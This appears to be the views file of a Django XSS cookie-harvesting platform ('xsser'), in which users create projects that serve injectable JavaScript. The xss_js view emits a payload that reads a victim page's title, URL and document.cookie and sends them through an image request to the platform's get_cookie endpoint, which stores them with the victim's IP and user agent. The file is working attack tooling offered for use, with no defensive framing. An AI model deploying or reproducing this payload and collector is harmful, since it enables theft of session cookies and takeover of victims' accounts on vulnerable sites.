#coding=utf-8
import json
from django.contrib.auth.models import User
from django.contrib.auth.decorators import login_required
from django.http import HttpResponse, Http404
from django.shortcuts import render, redirect
from xsser.settings import BASE_URL
from .models import XssProject, Record


@login_required(login_url="/login/")
def create_project(request):
    if request.method == "GET":
        return render(request, "core/create_project.html")
    else:
        title = request.POST.get("title")
        if not title:
            return render(request, "info.html", {"info": "请填写标题"})
        if len(title) > 25:
            title = title[:25]
        p = XssProject.objects.create(user=request.user, title=title)
        return render(request, "core/project_index.html", {"project": p})


@login_required(login_url="/login/")
def project_index(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(pk=int(project_id), user=request.user)
    except XssProject.DoesNotExist:
        raise Http404
    return render(request, "core/project_index.html", {"project": p, "base_url": BASE_URL})


def get_cookie(request):
    project_id = request.GET.get("id", "-1")
    title = request.GET.get("title")
    url = request.GET.get("url")
    cookie = request.GET.get("cookie")
    if "HTTP_X_FORWARDED_FOR" in request.META:
        ip = request.META['HTTP_X_FORWARDED_FOR']
    else:
        ip = request.META['REMOTE_ADDR']
    user_agent=request.META.get("HTTP_USER_AGENT")
    try:
        p = XssProject.objects.get(pk=int(project_id))
    except XssProject.DoesNotExist:
        raise Http404
    r = Record.objects.create(cookie=cookie, user_agent=user_agent, ip=ip, url=url, title=title)

    p.records.add(r)
    p.save()
    return HttpResponse("success")


def xss_js(request):
    project_id = request.GET.get("id", "-1")
    try:
        p = XssProject.objects.get(pk=int(project_id))
    except XssProject.DoesNotExist:
        raise Http404
    js = """
    var x=new Image();
    x.src=''+'%s'+'?a=info&id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
    """ % (BASE_URL + "get_cookie/", p.id)
    return HttpResponse(js)